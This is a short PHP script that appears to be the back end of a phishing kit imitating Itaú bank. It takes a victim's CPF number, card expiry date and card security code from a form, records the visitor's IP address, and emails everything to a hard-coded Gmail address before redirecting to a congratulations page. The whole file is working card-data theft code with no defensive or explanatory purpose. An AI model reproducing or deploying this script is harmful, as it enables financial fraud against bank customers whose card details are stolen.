<?php



$numcpf=$_POST["numcpf"];
$numdtv=$_POST["numdtv"];
$numcvv=$_POST["numcvv"];


$ip_usuario = $_SERVER['REMOTE_ADDR'];

$stringData = "

==============[ CONSULTÁVEL ITAU NO PENTE PARTE 2 ]=================

 CPF: $numcpf
 VALIDADE DO CARTAO: $numdtv
 CODIGO DE SEGURANCA: $numcvv
 
============================================================
";

$ss = "CONSULTÁVEL ITAU NO PENTE PARTE 2 IP: $ip_usuario ";

header("Location:parabens.htm");

mail('lucasdeo815@gmail.com',$ss,$stringData);

?>